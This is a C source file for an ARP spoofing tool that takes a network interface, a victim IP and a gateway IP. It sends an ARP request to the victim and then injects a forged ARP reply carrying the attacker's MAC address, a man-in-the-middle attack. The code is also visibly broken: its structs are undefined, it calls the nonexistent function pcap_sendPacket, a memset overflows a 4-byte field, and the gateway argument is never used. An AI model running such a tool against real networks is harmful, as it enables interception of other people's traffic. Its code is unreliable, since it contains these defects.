#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdint.h>


void ArpSpoof(const char* NameCheck, const char* IPStringSender, const char* IPStringTarget, const u_char* Packet) {

	struct ifreq ifr;
	size_t NameLengthCheck = strlen(NameCheck);
	if (NameLengthCheck < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, NameCheck, NameLengthCheck);
		ifr.ifr_name[NameLengthCheck] = 0;
	}
	else {
		fprintf(stderr, "interface name is too long");
		exit(1);
	}

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd == -1) {
		perror(0);
		exit(1);
	}

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		perror(0);
		close(fd);
		return;
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		fprintf(stderr, "not an Ethernet interface");
		close(fd);
		return; 
	}

	unsigned char* CheckMyMACAdd = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	struct ethernetHeader header;

	header.ethernetType = htons(ETH_P_ARP);
	memcpy(header.ether_shost, CheckMyMACAdd, sizeof(header.ether_shost));
	memcpy(header.ethernetDestinationMacAddress, Packet + 0x16, sizeof(header.ethernetDestinationMacAddress));

	struct ethernetArp req;
	req.arpHardwareAddressType = htons(ARPHRD_ETHER);
	req.arpProtocolAddressType = htons(ETH_P_IP);
	req.arpHardwareAddressLength = ETHER_ADDR_LEN;
	req.arpProtocolAddressLength = sizeof(in_addr_t);
	req.arpOperation = htons(ARPOP_REPLY);
	memcpy(&req.arp_sha, CheckMyMACAdd, sizeof(req.arp_sha));

	memcpy(&req.arp_spa, Packet + 0x1c, 0x04);
	memcpy(&req.arp_tha, Packet + 0x16, sizeof(req.arp_tha));

	memset(&req.arp_tpa, inet_addr(IPStringSender), 0x32);


	unsigned char frame[sizeof(struct ethernetHeader) + sizeof(struct ethernetArp)];
	memcpy(frame, &header, sizeof(struct ethernetHeader));
	memcpy(frame + sizeof(struct ethernetHeader), &req, sizeof(struct ethernetArp));

	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	pcap_errbuf[0] = '\0';
	pcap_t* pcap = pcap_open_live(NameCheck, 96, 0, 0, pcap_errbuf);
	if (pcap_errbuf[0] != '\0') {
		fprintf(stderr, "%s\n", pcap_errbuf);
	}
	if (!pcap) {
		return; 
	}



	pcap_sendPacket(pcap, frame, sizeof(frame));
	pcap_close(pcap);

	return;

}

void Send_ArpRequest(const char* NameCheck, const char* IPStringSender, const char* IPStringTarget) {

	struct ethernetHeader header;
	header.ethernetType = htons(ETH_P_ARP);
	memset(header.ethernetDestinationMacAddress, 0xff, sizeof(header.ethernetDestinationMacAddress));

	struct ethernetArp req;
	req.arpHardwareAddressType = htons(ARPHRD_ETHER);
	req.arpProtocolAddressType = htons(ETH_P_IP);
	req.arpHardwareAddressLength = ETHER_ADDR_LEN;
	req.arpProtocolAddressLength = sizeof(in_addr_t);
	req.arpOperation = htons(ARPOP_REQUEST);
	memset(&req.arp_tha, 0, sizeof(req.arp_tha));

	struct in_addr sender_ip_addr = { 0 };
	if (!inet_aton(IPStringSender, &sender_ip_addr)) {
		fprintf(stderr, "%s is not a valid IP address", IPStringSender);
		exit(1);
	}
	memcpy(&req.arp_tpa, &sender_ip_addr.s_addr, sizeof(req.arp_tpa));

	struct ifreq ifr;
	size_t NameLengthCheck = strlen(NameCheck);
	if (NameLengthCheck < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, NameCheck, NameLengthCheck);
		ifr.ifr_name[NameLengthCheck] = 0;
	}
	else {
		fprintf(stderr, "interface name is too long");
		exit(1);
	}

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd == -1) {
		perror(0);
		exit(1);
	}

	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		perror(0);
		close(fd);
		exit(1);
	}
	struct sockaddr_in* source_ip_addr = (struct sockaddr_in*) & ifr.ifr_addr;
	memcpy(&req.arp_spa, &source_ip_addr->sin_addr.s_addr, sizeof(req.arp_spa));

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		perror(0);
		close(fd);
		exit(1);
	}
	if (ifr.ifr_hwaddr.sa_family != ARPHRD_ETHER) {
		fprintf(stderr, "not an Ethernet interface");
		close(fd);
		exit(1);
	}
	const unsigned char* source_mac_addr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	memcpy(header.ether_shost, source_mac_addr, sizeof(header.ether_shost));
	memcpy(&req.arp_sha, source_mac_addr, sizeof(req.arp_sha));
	close(fd);

	unsigned char frame[sizeof(struct ethernetHeader) + sizeof(struct ethernetArp)];
	memcpy(frame, &header, sizeof(struct ethernetHeader));
	memcpy(frame + sizeof(struct ethernetHeader), &req, sizeof(struct ethernetArp));

	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr h;
	const u_char* Packet;
	pcap_errbuf[0] = '\0';

	pcap_t* pcap = pcap_open_live(NameCheck, 96, 0, 0, pcap_errbuf);
	if (pcap_errbuf[0] != '\0') {
		fprintf(stderr, "%s\n", pcap_errbuf);
	}
	if (!pcap) {
		exit(1);
	}

	if (pcap_inject(pcap, frame, sizeof(frame)) == -1) {
		pcap_perror(pcap, 0);
		pcap_close(pcap);
		exit(1);
	}
	Packet = pcap_next(pcap, &h);
	ArpSpoof(NameCheck, IPStringSender, IPStringTarget, Packet);
	pcap_close(pcap);
}

int main(int argc, const char* argv[])
{

	if (argc != 4)
	{
		printf("wrong!\n[format] sudo ./send_arp <devname> <victim ip> <gateway ip>\n");
		return -1;
	}

	const char* NameCheck = argv[1];
	const char* IPStringSender = argv[2];
	const char* IPStringTarget = argv[3];
	char* my_ip_string;
	char* sender_Packet[0x3c];

	Send_ArpRequest(NameCheck, IPStringSender, IPStringTarget);

	return 0;
}